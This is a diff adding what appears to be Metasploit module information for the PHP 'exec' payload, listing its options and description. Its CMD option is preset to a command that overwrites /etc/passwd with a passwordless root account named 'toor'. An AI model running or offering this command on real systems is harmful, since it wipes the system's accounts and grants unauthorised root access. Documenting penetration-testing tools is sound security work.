@@ -1,0 +1,27 @@
+
+       Name: PHP Execute Command 
+     Module: payload/php/exec
+   Platform: PHP
+       Arch: php
+Needs Admin: No
+ Total size: 1418
+       Rank: Normal
+
+Provided by:
+    egypt <egypt@metasploit.com>
+
+Basic options:
+Name  Current Setting                           Required  Description
+----  ---------------                           --------  -----------
+CMD   echo "toor::0:0:::/bin/bash">/etc/passwd  yes       The command string to execute
+
+Description:
+  Execute a single system command
+
+
+    Name       Current Setting  Required  Description
+    ----       ---------------  --------  -----------
+    VERBOSE    false            no        Enable detailed status messages
+    WORKSPACE                   no        Specify the workspace for this module
+    Name  Current Setting  Required  Description
+    ----  ---------------  --------  -----------
